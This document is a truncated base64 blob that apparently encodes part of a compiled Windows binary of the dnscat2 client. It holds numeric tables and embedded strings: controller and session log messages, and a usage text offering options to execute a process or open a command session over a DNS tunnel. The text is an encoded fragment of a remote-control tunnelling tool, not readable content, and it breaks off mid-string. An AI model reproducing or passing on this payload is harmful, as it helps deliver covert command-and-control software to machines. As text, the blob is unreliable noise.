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MTAAAAAAAAAAAAAAAP///////z9D////////P8MuLlxjb250cm9sbGVyXGNvbnRyb2xsZXIuYwAAAAAAAGNvbnRyb2xsZXJfZGF0YV9pbmNvbWluZwAAAAAAAAAAVHJpZWQgdG8gYWNjZXNzIGEgbm9uLWV4aXN0ZW50IHNlc3Npb24gKCVzKTogJWQAVGhlcmUgYXJlIG5vIGFjdGl2ZSBzZXNzaW9ucyBsZWZ0ISBHb29kYnllIQAAAAAAVGhlIHNlcnZlciBoYXNuJ3QgcmV0dXJuZWQgYSB2YWxpZCByZXNwb25zZSBpbiB0aGUgbGFzdCAlZCBhdHRlbXB0cy4uIGNsb3Npbmcgc2Vzc2lvbi4AAC4uXGNvbnRyb2xsZXJccGFja2V0LmMAAFBhY2tldCBpcyB0b28gbG9uZzogJXp1IGJ5dGVzCgAARXJyb3I6IHVua25vd24gbWVzc2FnZSB0eXBlICgweCUwMngpCgAAAFBhY2tldCBpcyB0b28gc2hvcnQhCgAAAEF0dGVtcHRlZCB0byBzZXQgdGhlICduYW1lJyBmaWVsZCBvZiBhIG5vbi1TWU4gbWVzc2FnZQoAQXR0ZW1wdGVkIHRvIHNldCB0aGUgJ2lzX2NvbW1hbmQnIGZpZWxkIG9mIGEgbm9uLVNZTiBtZXNzYWdlCgAAAEF0dGVtcHRlZCB0byBzZXQgZW5jcnlwdGlvbiBvcHRpb25zIGZvciBhIG5vbi1FTkMgbWVzc2FnZQoAAAAAAAAAAAAAAAAAAEVycm9yOiBPbmUgb2YgdGhlIHBhY2tldF9lbmNfc2V0XyooKSBmdW5jdGlvbnMgaGF2ZSB0byBiZSBjYWxsZWQhAAAAAAAAAEVycm9yOiBVbmtub3duIGVuY3J5cHRpb24gc3VidHlwZTogMHglMDR4AAAAAAAAAEVycm9yOiBVbmtub3duIG1lc3NhZ2UgdHlwZTogJXUKAAAAAAAAAABUeXBlID0gU1lOIDo6IFsweCUwNHhdIHNlc3Npb24gPSAweCUwNHgsIHNlcSA9IDB4JTA0eCwgb3B0aW9ucyA9IDB4JTA0eAAAAAAAAAAAAFR5cGUgPSBNU0cgOjogWzB4JTA0eF0gc2Vzc2lvbiA9IDB4JTA0eCwgc2VxID0gMHglMDR4LCBhY2sgPSAweCUwNHgsIGRhdGEgPSAweCV4IGJ5dGVzAABUeXBlID0gRklOIDo6IFsweCUwNHhdIHNlc3Npb24gPSAweCUwNHggOjogJXMAAABUeXBlID0gUElORyA6OiBbMHglMDR4XSBkYXRhID0gJXMAAAAAAAAAVHlwZSA9IEVOQyA6OiBbMHglMDR4XSBzZXNzaW9uID0gMHglMDR4AFVua25vd24gcGFja2V0IHR5cGUhAAAAAFNZTgBNU0cARklOAFBJTkcAAAAARU5DAFVua25vd24hAAAAAAAAAABVbmtub3duAC4uXGNvbnRyb2xsZXJcc2Vzc2lvbi5jAFRoZXJlIGlzbid0IGVub3VnaCByb29tIGluIHRoaXMgcHJvdG9jb2wgdG8gZW5jcnlwdCBwYWNrZXRzIQAAAABJbiBQSU5HLCBzZW5kaW5nIGEgUElORyBwYWNrZXQgKCV6ZCBieXRlcyBvZiBkYXRhLi4uKQAAAFRoZSBzZXJ2ZXIgZGlkbid0IHJlc3BvbmQgdG8gb3VyIHJlLW5lZ290aWF0aW9uIHJlcXVlc3QhIFdhaXRpbmcuLi4AAAAAAAAAAAAAAAAAV293LCB0aGlzIHNlc3Npb24gaXMgb2xkISBUaW1lIHRvIHJlLW5lZ290aWF0ZSBlbmNyeXB0aW9uIGtleXMhAEluIFNFU1NJT05fU1RBVEVfRVNUQUJMSVNIRUQsIHNlbmRpbmcgYSBNU0cgcGFja2V0IChTRVEgPSAweCUwNHgsIEFDSyA9IDB4JTA0eCwgJXpkIGJ5dGVzIG9mIGRhdGEuLi4pAAAAU3RyZWFtIGNsb3NlZAAAAFdvdW5kIHVwIGluIGFuIHVua25vd24gc3RhdGU6IDB4JXgAAAAAAABPVVRHT0lORzogAAAKAAAAUmVjZWl2ZWQgYW4gdW5leHBlY3RlZCBlbmNyeXB0aW9uIHBhY2tldCBmb3IgdGhpcyBzdGF0ZTogMHglMDR4IQAAAAAAAAAARmFpbGVkIHRvIGNhbGN1bGF0ZSBhIHNoYXJlZCBzZWNyZXQhAAAAAEVuY3J5cHRlZCBzZXNzaW9uIGVzdGFibGlzaGVkISBGb3IgYWRkZWQgc2VjdXJpdHksIHBsZWFzZSB2ZXJpZnkgdGhlIHNlcnZlciBhbHNvIGRpc3BsYXlzIHRoaXMgc3RyaW5nOgoAUmVjZWl2ZWQgYW4gdW5leHBlY3RlZCByZW5lZ290aWF0aW9uIGZyb20gdGhlIHNlcnZlciEAAABGYWlsZWQgdG8gY2FsY3VsYXRlIGEgc2hhcmVkIHNlY3JldCBmb3IgcmVuZWdvdGlhdGlvbiEAAAAAAAAAAAAAU2VydmVyIHJlc3BvbmRlZCB0byByZS1uZWdvdGlhdGlvbiByZXF1ZXN0ISBTd2l0Y2hpbmcgdG8gbmV3IGtleXMhAAAAAAAAAAAAAAAAAABUaGVpciBhdXRoZW50aWNhdG9yIHdhcyB3cm9uZyEgVGhhdCBsaWtlbHkgbWVhbnMgc29tZXRoaW5nIHdlaXJkIGlzIGhhcHBlbmluZyBvbiB0aGUgbmV3dG9yay4uLgAqKiBQZWVyIHZlcmlmaWVkIHdpdGggcHJlLXNoYXJlZCBzZWNyZXQhCgAAAAAAAABTZXNzaW9uIGVzdGFibGlzaGVkIQoAAABJbiBTRVNTSU9OX1NUQVRFX0VTVEFCTElTSEVELCByZWNlaXZlZCBhIE1TRwAAAABCYWQgQUNLIHJlY2VpdmVkICglZCBieXRlcyBhY2tlZDsgJWQgYnl0ZXMgaW4gdGhlIGJ1ZmZlcikAAAAAAAAAQmFkIFNFUSByZWNlaXZlZCAoRXhwZWN0ZWQgJWQsIHJlY2VpdmVkICVkKQAAAAAAUmVjZWl2ZWQgRklOOiAocmVhc29uOiAnJXMnKSAtIGNsb3Npbmcgc2Vzc2lvbgAAUmVjZWl2ZWQgYSAlcyBwYWNrZXQgaW4gc3RhdGUgJXMhAAAAAAAAAFJlY2VpdmVkIGEgJXMgcGFja2V0IGluIHN0YXRlICVzOyBpZ25vcmluZyEAAAAAAFNlcnZlcidzIHNpZ25hdHVyZSB3YXMgd3JvbmchIElnbm9yaW5nIQBJTkNPTUlORzogAAAAAAAAUmVjZWl2ZWQgYW4gaWxsZWdhbCBwYWNrZXQ6AAAAAABXZSBlbmRlZCB1cCBpbiBhbiBpbGxlZ2FsIHN0YXRlOiAweCV4AAAAVHJpZWQgdG8ga2lsbCBhIHNlc3Npb24gdGhhdCdzIGFscmVhZHkgZGVhZDogJWQAICgAACkAAABGYWlsZWQgdG8gZ2VuZXJhdGUgYSBrZXlwYWlyIQAAAFNldHRpbmcgc2Vzc2lvbi0+bmFtZSB0byAlcwAAAAAAV0FSTklORzogU2V0dGluZyBhIGN1c3RvbSBJU04gY2FuIGJlIGRhbmdlcm91cyEAQkVGT1JFX0lOSVQAAAAAAEJFRk9SRV9BVVRIAE5FVwBFU1RBQkxJU0hFRAAAAAAALi5cZG5zY2F0LmMAAAAAAENyZWF0aW5nIGEgY29uc29sZSBzZXNzaW9uIQoAAAAAY29uc29sZQBDcmVhdGluZyBhIGV4ZWMoJyVzJykgc2Vzc2lvbiEKAENyZWF0aW5nIGEgY29tbWFuZCBzZXNzaW9uIQoAAAAAY29tbWFuZABDcmVhdGluZyBhIHBpbmcgc2Vzc2lvbiEKAAAAcGluZwAAAAAAAAAAVGVybWluYXRpbmcAAAAAAFVzYWdlOiAlcyBbYXJnc10gW2RvbWFpbl0KCkdlbmVyYWwgb3B0aW9uczoKIC0taGVscCAtaCAgICAgICAgICAgICAgIFRoaXMgcGFnZS4KIC0tdmVyc2lvbiAgICAgICAgICAgICAgIEdldCB0aGUgdmVyc2lvbi4KIC0tZGVsYXkgPG1zPiAgICAgICAgICAgIFNldCB0aGUgbWF4aW11bSBkZWxheSBiZXR3ZWVuIHBhY2tldHMgKGRlZmF1bHQ6IDEwMDApLgogICAgICAgICAgICAgICAgICAgICAgICAgVGhlIG1pbmltdW0gaXMgdGVjaG5pY2FsbHkgNTAgZm9yIHRlY2huaWNhbCByZWFzb25zLAogICAgICAgICAgICAgICAgICAgICAgICAgYnV0IHRyYW5zbWl0dGluZyB0b28gcXVpY2tseSBtaWdodCBtYWtlIHBlcmZvcm1hbmNlCiAgICAgICAgICAgICAgICAgICAgICAgICB3b3JzZS4KIC0tc3RlYWR5ICAgICAgICAgICAgICAgIElmIHNldCwgYWx3YXlzIHdhaXQgZm9yIHRoZSBkZWxheSBiZWZvcmUgc2VuZGluZy4KICAgICAgICAgICAgICAgICAgICAgICAgIHRoZSBuZXh0IG1lc3NhZ2UgKGJ5IGRlZmF1bHQsIHdoZW4gYSByZXNwb25zZSBpcwogICAgICAgICAgICAgICAgICAgICAgICAgcmVjZWl2ZWQsIHRoZSBuZXh0IG1lc3NhZ2UgaXMgaW1tZWRpYXRlbHkgdHJhbnNtaXR0ZWQuCiAtLW1heC1yZXRyYW5zbWl0cyA8bj4gICBPbmx5IHJlLXRyYW5zbWl0IGEgbWVzc2FnZSA8bj4gdGltZXMgYmVmb3JlIGdpdmluZyB1cAogICAgICAgICAgICAgICAgICAgICAgICAgYW5kIGFzc3VtaW5nIHRoZSBzZXJ2ZXIgaXMgZGVhZCAoZGVmYXVsdDogMjApLgogLS1yZXRyYW5zbWl0LWZvcmV2ZXIgICAgU2V0IGlmIHlvdSB3YW50IHRoZSBjbGllbnQgdG8gcmUtdHJhbnNtaXQgZm9yZXZlcgogICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgYSBzZXJ2ZXIgdHVybnMgdXAuIFRoaXMgY2FuIGJlIGhlbHBmdWwsIGJ1dCBhbHNvCiAgICAgICAgICAgICAgICAgICAgICAgICBtYWtlcyB0aGUgc2VydmVyIHBvdGVudGlhbGx5IHJ1biBmb3JldmVyLgogLS1zZWNyZXQgICAgICAgICAgICAgICAgU2V0IHRoZSBzaGFyZWQgc2VjcmV0OyBzZXQgdGhlIHNhbWUgb25lIG9uIHRoZSBzZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAgICAgIGFuZCB0aGUgY2xpZW50IHRvIHByZXZlbnQgbWFuLWluLXRoZS1taWRkbGUgYXR0YWNrcyEKIC0tbm8tZW5jcnlwdGlvbiAgICAgICAgIFR1cm4gb2ZmIGVuY3J5cHRpb24vYXV0aGVudGljYXRpb24uCgpJbnB1dCBvcHRpb25zOgogLS1jb25zb2xlICAgICAgICAgICAgICAgU2VuZC9yZWNlaXZlIG91dHB1dCB0byB0aGUgY29uc29sZS4KIC0tZXhlYyAtZSA8cHJvY2Vzcz4gICAgIEV4ZWN1dGUgdGhlIGdpdmVuIHByb2Nlc3MgYW5kIGxpbmsgaXQgdG8gdGhlIHN0cmVhbS4KIC0tY29tbWFuZCAgICAgICAgICAgICAgIFN0YXJ0IGFuIGludGVyYWN0aXZlICdjb21tYW5kJyBzZXNzaW9uIChkZWZhdWx0KS4KIC0tcGluZyAgICAgICAgICAgICAgICAgIFNpbXBseSBjaGVjayBpZiB0aGVyZSdzIGEgZG5zY2F0MiBzZXJ2ZXIgbGlzdGVuaW5nLgoKRGVidWcgb3B0aW9uczoKIC1kICAgICAgICAgICAgICAgICAgICAgIERpc3BsYXkgbW9yZSBkZWJ1ZyBpbmZvIChjYW4gYmU